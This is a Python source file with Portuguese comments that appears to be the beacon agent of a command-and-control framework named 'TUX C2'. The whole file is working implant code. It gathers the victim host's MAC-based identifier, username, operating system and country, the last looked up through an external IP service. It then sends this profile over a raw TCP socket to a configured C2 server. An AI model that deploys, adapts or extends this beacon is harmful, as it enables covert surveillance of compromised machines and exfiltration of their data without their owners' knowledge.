"""Agente beacon do TUX C2 — coleta dados do host e registra no servidor."""
import json
import os
import platform
import socket
import uuid

from config import settings

SERVER_HOST = settings.BEACON_HOST
SERVER_PORT = settings.PORT


def _current_user() -> str:
    try:
        return os.getlogin()
    except OSError:
        import getpass
        return getpass.getuser()


def _country_best_effort() -> str:
    """País via API pública (best-effort); offline → 'Desconhecido'."""
    try:
        import requests
        r = requests.get("https://ipapi.co/country_name/", timeout=1.5)
        if r.status_code == 200 and len(r.text.strip()) < 60:
            return r.text.strip()
    except Exception:
        pass
    return "Desconhecido"


def collect_system_info() -> dict:
    """Coleta informações do sistema para envio ao servidor C2."""
    return {
        "identifier": hex(uuid.getnode()),
        "country": _country_best_effort(),
        "status": "online",
        "username": _current_user(),
        "os": f"{platform.system()}_{platform.release()}",
        "ram": "N/A",
        "signal": "Boa",
    }


def send_beacon(host: str = None, port: int = None):
    """Envia o beacon de registro ao servidor C2."""
    host = host or SERVER_HOST
    port = port or SERVER_PORT
    payload = collect_system_info()
    data = json.dumps(payload).encode("utf-8")
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(5)
        s.connect((host, port))
        s.sendall(data)
    print(f"[*] Beacon enviado para {host}:{port}")


if __name__ == "__main__":
    send_beacon()
